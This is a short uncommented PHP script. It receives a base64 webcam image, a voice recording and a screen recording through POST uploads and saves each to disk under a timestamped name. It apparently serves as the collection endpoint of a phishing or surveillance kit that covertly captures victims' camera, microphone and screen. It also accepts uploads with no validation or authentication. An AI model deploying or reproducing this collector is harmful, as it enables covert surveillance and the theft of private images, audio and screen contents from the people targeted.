<?php



$date = date('dMYHis');
$imageData=$_POST['cat'];

if (!empty($_POST['cat'])) {
error_log("Received" . "\r\n", 3, "Log.log");
$filteredData=substr($imageData, strpos($imageData, ",")+1);
$unencodedData=base64_decode($filteredData);
$fp = fopen( 'cam'.$date.'.png', 'wb' );
fwrite( $fp, $unencodedData);
fclose( $fp );


}

if (!empty($_FILES['voice'])) {
    $vFile = 'voice'.$date.'.wav';
    move_uploaded_file($_FILES['voice']['tmp_name'], $vFile);
}

if (!empty($_FILES['screen'])) {
    $sFile = 'screen'.$date.'.webm';
    move_uploaded_file($_FILES['screen']['tmp_name'], $sFile);
}



exit();
?>

